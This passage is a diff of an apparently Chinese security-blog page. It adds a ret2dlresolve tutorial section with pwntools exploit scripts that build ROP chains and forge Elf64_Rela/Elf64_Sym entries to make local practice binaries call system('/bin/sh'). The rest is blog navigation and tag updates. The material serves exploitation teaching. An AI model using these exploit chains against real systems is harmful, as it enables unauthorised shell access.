puts@plt -&gt; system(&quot;/bin/sh&quot;)</span></span><br><span class="line">p.send(flat(<span class="string">b&quot;A&quot;</span>*PAD, pop_rdi, bin_sh, puts_plt))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意</strong>：不要指望 libc 调用返回后 rdx 仍保持原值。老 glibc 的 read 包装是裸 syscall，不碰 rdx，可以省略第三个参数的设置；新 glibc 的 read 包装带取消点逻辑，返回后 rdx 已被破坏，必须用 pop rdx 显式设置。</p>
+<h3 id="Partial-RELRO：伪造-Elf64-Rela-Elf64-Sym"><a href="#Partial-RELRO：伪造-Elf64-Rela-Elf64-Sym" class="headerlink" title="Partial RELRO：伪造 Elf64_Rela &#x2F; Elf64_Sym"></a>Partial RELRO：伪造 Elf64_Rela &#x2F; Elf64_Sym</h3><ul>
+<li><code>Elf64_Rela</code>（24 字节）：<code>r_info = (sym_index &lt;&lt; 32) | 7</code>（R_X86_64_JUMP_SLOT），比 32 位多一个 <code>r_addend</code> 字段，填 0</li>
+<li><code>Elf64_Sym</code>（24 字节）：字段含义同 32 位</li>
+<li>触发时压入的是伪造重定位项在 .rela.plt 中的<strong>索引</strong>（64 位是索引，不是字节偏移）</li>
+<li>参数通过 <code>pop rdi</code> 传入</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./vuln64_partial&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./vuln64_partial&quot;</span>)</span><br><span class="line"></span><br><span class="line">PAD = <span class="number">0x68</span></span><br><span class="line">rela_plt = elf.get_section_by_name(<span class="string">&quot;.rela.plt&quot;</span>).header.sh_addr</span><br><span class="line">dynsym   = elf.get_section_by_name(<span class="string">&quot;.dynsym&quot;</span>).header.sh_addr</span><br><span class="line">dynstr   = elf.get_section_by_name(<span class="string">&quot;.dynstr&quot;</span>).header.sh_addr</span><br><span class="line">plt0     = elf.get_section_by_name(<span class="string">&quot;.plt&quot;</span>).header.sh_addr</span><br><span class="line">read_plt = elf.plt[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">vuln     = elf.symbols[<span class="string">&quot;vuln&quot;</span>]</span><br><span class="line">got_read = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">pop_rdi  = elf.symbols[<span class="string">&quot;pop_rdi&quot;</span>]</span><br><span class="line">pop_rsi  = elf.symbols[<span class="string">&quot;pop_rsi&quot;</span>]</span><br><span class="line">pop_rdx  = elf.symbols[<span class="string">&quot;pop_rdx&quot;</span>]</span><br><span class="line"></span><br><span class="line">bss = elf.bss() + <span class="number">0x800</span></span><br><span class="line"><span class="comment"># 对齐：fake_rel - rela_plt、fake_sym - dynsym 都是 0x18 的倍数</span></span><br><span class="line">fake_rel = bss + (rela_plt - bss) % <span class="number">0x18</span></span><br><span class="line">gap = <span class="number">0x18</span> + (dynsym - fake_rel - <span class="number">0x18</span>) % <span class="number">0x18</span></span><br><span class="line">fake_sym = fake_rel + gap</span><br><span class="line">str_addr = fake_sym + <span class="number">0x18</span></span><br><span class="line">bin_sh   = str_addr + <span class="number">0x8</span></span><br><span class="line">sym_index = (fake_sym - dynsym) // <span class="number">0x18</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 把伪造的结构体读进 bss</span></span><br><span class="line">p.send(flat(<span class="string">b&quot;A&quot;</span>*PAD, pop_rdi, <span class="number">0</span>, pop_rsi, fake_rel, pop_rdx, <span class="number">0x200</span>, read_plt, vuln))</span><br><span class="line">st_name = str_addr - dynstr</span><br><span class="line">payload2 = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: p64(got_read) + p64((sym_index &lt;&lt; <span class="number">32</span>) | <span class="number">7</span>) + p64(<span class="number">0</span>),</span><br><span class="line">    gap:  p32(st_name) + p8(<span class="number">0x12</span>) + p8(<span class="number">0</span>) + p16(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>),</span><br><span class="line">    gap + <span class="number">0x18</span>: <span class="string">b&quot;system\x00\x00&quot;</span>,</span><br><span class="line">    gap + <span class="number">0x20</span>: <span class="string">b&quot;/bin/sh\x00&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. rdi = &quot;/bin/sh&quot;，跳 plt[0] 压入 reloc 索引触发解析</span></span><br><span class="line">p.send(flat(<span class="string">b&quot;A&quot;</span>*PAD, pop_rdi, bin_sh, plt0, (fake_rel - rela_plt) // <span class="number">0x18</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>.gnu.version 校验的处理同 32 位一节：解析失败时先调整对齐，使 <code>versym + 2*sym_index</code> 处读到 0。</p>
+<h3 id="Full-RELRO：经典手法失效-1"><a href="#Full-RELRO：经典手法失效-1" class="headerlink" title="Full RELRO：经典手法失效"></a>Full RELRO：经典手法失效</h3><p>与 32 位相同：BIND_NOW 消灭了延迟绑定，经典手法不可用。进阶思路同样是篡改 ld.so 中 link_map 的 <code>l_info[DT_STRTAB]</code> 并直接调用 <code>_dl_runtime_resolve</code>（64 位下其参数为 link_map 和 reloc 索引，且需先用 pop rdi 布置函数参数），前提是任意地址写与 ld.so 基址泄露。</p>
+<h2 id="pwntools-一键利用"><a href="#pwntools-一键利用" class="headerlink" title="pwntools 一键利用"></a>pwntools 一键利用</h2><p>pwntools 自带 Ret2dlresolvePayload，自动完成结构体布局与对齐（包括 .gnu.version 的处理），适用于 32&#x2F;64 位的 No&#x2F;Partial RELRO：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line"></span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf, symbol=<span class="string">&quot;system&quot;</span>, args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line">rop = ROP(elf)</span><br><span class="line">rop.read(<span class="number">0</span>, dlresolve.data_addr)   <span class="comment"># 把自动生成的结构体读进内存</span></span><br><span class="line">rop.ret2dlresolve(dlresolve)       <span class="comment"># 生成触发解析的 rop 链</span></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&quot;A&quot;</span> * padding + rop.chain())</span><br><span class="line">p.send(dlresolve.payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
     </div>
     
@@ -231,29 +301,31 @@
       
         <a class="kk-tag-chip kk-chip-4" href="/tags/setcontext/">#setcontext</a>
       
+        <a class="kk-tag-chip kk-chip-5" href="/tags/ret2dlresolve/">#ret2dlresolve</a>
+      
     </div>
     
   </div>
 
   <nav class="kk-post-nav" data-reveal>
     
-      <a class="kk-card kk-pnav kk-cover-1" href="/2026/07/15/pwn-shellcode/">
-        
-        <span class="kk-cover-photo" style="background-image:url('https://www.dmoe.cc/random.php?seed=8897')"></span>
-        <span class="kk-cover-shade"></span>
-        
-        <span class="kk-pnav-label">‹ 上一篇</span>
-        <span class="kk-pnav-title">Shellcode 合集</span>
-      </a>
-    
-    
-      <a class="kk-card kk-pnav kk-pnav-next kk-cover-6" href="/2026/07/15/pwn-kernel/">
+      <a class="kk-card kk-pnav kk-cover-6" href="/2026/07/15/pwn-kernel/">
         
         <span class="kk-cover-photo" style="background-image:url('https://www.dmoe.cc/random.php?seed=49966')"></span>
         <span class="kk-cover-shade"></span>
         
-        <span class="kk-pnav-label">下一篇 ›</span>
+        <span class="kk-pnav-label">‹ 上一篇</span>
         <span class="kk-pnav-title">Linux 内核漏洞</span>
+      </a>
+    
+    
+      <a class="kk-card kk-pnav kk-pnav-next kk-cover-3" href="/2026/07/15/pwn-assembly/">
+        
+        <span class="kk-cover-photo" style="background-image:url('https://www.dmoe.cc/random.php?seed=10419')"></span>
+        <span class="kk-cover-shade"></span>
+        
+        <span class="kk-pnav-label">下一篇 ›</span>
+        <span class="kk-pnav-title">汇编语言速成</span>
       </a>
     
   </nav>
@@ -266,7 +338,7 @@
     <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M8 6h13M8 12h13M8 18h13"/><circle cx="3.5" cy="6" r="1.3" fill="currentColor" stroke="none"/><circle cx="3.5" cy="12" r="1.3" fill="currentColor" stroke="none"/><circle cx="3.5" cy="18" r="1.3" fill="currentColor" stroke="none"/></svg>
     目录
   </h3>
-  <div class="kk-toc" id="kk-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SROP"><span class="toc-text">SROP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Magic-Gadget"><span class="toc-text">Magic Gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Magic1"><span class="toc-text">Magic1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Magic2%EF%BC%9A-rax-%E2%86%92rdx"><span class="toc-text">Magic2：[rax]→rdx</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Magic3%EF%BC%9A-rdi-%E2%86%92rdx"><span class="toc-text">Magic3：[rdi]→rdx</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#setcontext"><span class="toc-text">setcontext</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2dlresolve"><span class="toc-text">ret2dlresolve</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#amd64"><span class="toc-text">amd64</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Partial-RELRO"><span class="toc-text">Partial RELRO</span></a></li></ol></li></ol></li></ol></div>
+  <div class="kk-toc" id="kk-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SROP"><span class="toc-text">SROP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Magic-Gadget"><span class="toc-text">Magic Gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Magic1"><span class="toc-text">Magic1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Magic2%EF%BC%9A-rax-%E2%86%92rdx"><span class="toc-text">Magic2：[rax]→rdx</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Magic3%EF%BC%9A-rdi-%E2%86%92rdx"><span class="toc-text">Magic3：[rdi]→rdx</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#setcontext"><span class="toc-text">setcontext</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2dlresolve"><span class="toc-text">ret2dlresolve</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%8E%9F%E7%90%86"><span class="toc-text">延迟绑定原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32-%E4%BD%8D"><span class="toc-text">32 位</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#No-RELRO%EF%BC%9A%E6%94%B9%E5%86%99-DT-STRTAB"><span class="toc-text">No RELRO：改写 DT_STRTAB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Partial-RELRO%EF%BC%9A%E4%BC%AA%E9%80%A0-Elf32-Rel-Elf32-Sym"><span class="toc-text">Partial RELRO：伪造 Elf32_Rel &#x2F; Elf32_Sym</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Full-RELRO%EF%BC%9A%E7%BB%8F%E5%85%B8%E6%89%8B%E6%B3%95%E5%A4%B1%E6%95%88"><span class="toc-text">Full RELRO：经典手法失效</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64-%E4%BD%8D"><span class="toc-text">64 位</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#No-RELRO%EF%BC%9A%E6%94%B9%E5%86%99-DT-STRTAB-1"><span class="toc-text">No RELRO：改写 DT_STRTAB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Partial-RELRO%EF%BC%9A%E4%BC%AA%E9%80%A0-Elf64-Rela-Elf64-Sym"><span class="toc-text">Partial RELRO：伪造 Elf64_Rela &#x2F; Elf64_Sym</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Full-RELRO%EF%BC%9A%E7%BB%8F%E5%85%B8%E6%89%8B%E6%B3%95%E5%A4%B1%E6%95%88-1"><span class="toc-text">Full RELRO：经典手法失效</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwntools-%E4%B8%80%E9%94%AE%E5%88%A9%E7%94%A8"><span class="toc-text">pwntools 一键利用</span></a></li></ol></li></ol></div>
 </div>
 
 </div></aside>
@@ -278,6 +350,22 @@
       最新文章
     </h3>
     <ul class="kk-recent">
+      
+        <li>
+          <a class="kk-recent-link" href="/2026/07/20/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/">
+            <span class="kk-recent-dot kk-cover-6" aria-hidden="true"></span>
+            <span class="kk-recent-title">内存取证</span>
+            <time>07-20</time>
+          </a>
+        </li>
+      
+        <li>
+          <a class="kk-recent-link" href="/2026/07/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+            <span class="kk-recent-dot kk-cover-6" aria-hidden="true"></span>
+            <span class="kk-recent-title">信息收集</span>
+            <time>07-20</time>
+          </a>
+        </li>
       
         <li>
           <a class="kk-recent-link" href="/2026/07/19/%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF/">
@@ -303,22 +391,6 @@
           </a>
         </li>
       
-        <li>
-          <a class="kk-recent-link" href="/2026/07/15/pwn-assembly/">
-            <span class="kk-recent-dot kk-cover-5" aria-hidden="true"></span>
-            <span class="kk-recent-title">汇编语言从入门到精通</span>
-            <time>07-15</time>
-          </a>
-        </li>
-      
-        <li>
-          <a class="kk-recent-link" href="/2026/07/15/pwn-chrome-v8/">
-            <span class="kk-recent-dot kk-cover-2" aria-hidden="true"></span>
-            <span class="kk-recent-title">Chrome V8 PWN从入门到精通</span>
-            <time>07-15</time>
-          </a>
-        </li>
-      
     </ul>
   </div>
 
@@ -339,14 +411,14 @@
         <li>
           <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">
             <span>应急响应</span>
-            <span class="kk-badge">1</span>
+            <span class="kk-badge">2</span>
           </a>
         </li>
       
         <li>
           <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
             <span>渗透测试</span>
-            <span class="kk-badge">2</span>
+            <span class="kk-badge">3</span>
           </a>
         </li>
       
@@ -386,27 +458,39 @@
       
         <a class="kk-tag-chip kk-chip-4" href="/tags/pwn/">#pwn</a>
       
-        <a class="kk-tag-chip kk-chip-5" href="/tags/setcontext/">#setcontext</a>
+        <a class="kk-tag-chip kk-chip-5" href="/tags/ret2dlresolve/">#ret2dlresolve</a>
       
-        <a class="kk-tag-chip kk-chip-6" href="/tags/shellcode/">#shellcode</a>
+        <a class="kk-tag-chip kk-chip-6" href="/tags/setcontext/">#setcontext</a>
       
-        <a class="kk-tag-chip kk-chip-7" href="/tags/srop/">#srop</a>
+        <a class="kk-tag-chip kk-chip-7" href="/tags/shellcode/">#shellcode</a>
       
-        <a class="kk-tag-chip kk-chip-0" href="/tags/stack-overflow/">#stack-overflow</a>
+        <a class="kk-tag-chip kk-chip-0" href="/tags/srop/">#srop</a>
       
-        <a class="kk-tag-chip kk-chip-1" href="/tags/v8/">#v8</a>
+        <a class="kk-tag-chip kk-chip-1" href="/tags/stack-overflow/">#stack-overflow</a>
       
-        <a class="kk-tag-chip kk-chip-2" href="/tags/windows/">#windows</a>
+        <a class="kk-tag-chip kk-chip-2" href="/tags/v8/">#v8</a>
       
-        <a class="kk-tag-chip kk-chip-3" href="/tags/x64/">#x64</a>
+        <a class="kk-tag-chip kk-chip-3" href="/tags/volatility/">#volatility</a>
       
-        <a class="kk-tag-chip kk-chip-4" href="/tags/x86/">#x86</a>
+        <a class="kk-tag-chip kk-chip-4" href="/tags/windows/">#windows</a>
       
-        <a class="kk-tag-chip kk-chip-5" href="/tags/%E5%85%8D%E6%9D%80/">#免杀</a>
+        <a class="kk-tag-chip kk-chip-5" href="/tags/x64/">#x64</a>
       
-        <a class="kk-tag-chip kk-chip-6" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">#应急响应</a>
+        <a class="kk-tag-chip kk-chip-6" href="/tags/x86/">#x86</a>
       
-        <a class="kk-tag-chip kk-chip-7" href="/tags/%E6%8F%90%E6%9D%83/">#提权</a>
+        <a class="kk-tag-chip kk-chip-7" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">#信息收集</a>
+      
+        <a class="kk-tag-chip kk-chip-0" href="/tags/%E5%85%8D%E6%9D%80/">#免杀</a>
+      
+        <a class="kk-tag-chip kk-chip-1" href="/tags/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/">#内存取证</a>
+      
+        <a class="kk-tag-chip kk-chip-2" href="/tags/%E5%86%85%E7%BD%91/">#内网</a>
+      
+        <a class="kk-tag-chip kk-chip-3" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">#应急响应</a>
+      
+        <a class="kk-tag-chip kk-chip-4" href="/tags/%E6%8F%90%E6%9D%83/">#提权</a>
+      
+        <a class="kk-tag-chip kk-chip-5" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">#渗透测试</a>
       
     </div>
   </div>
@@ -423,8 +507,8 @@
     · Theme <b>KiraKira</b>
   </p>
   <p class="kk-footer-stats">
-    全站 9.5w 字
-     · 已陪伴你 <b>6</b> 天
+    全站 11.2w 字
+     · 已陪伴你 <b>7</b> 天
   </p>
 </footer>
 
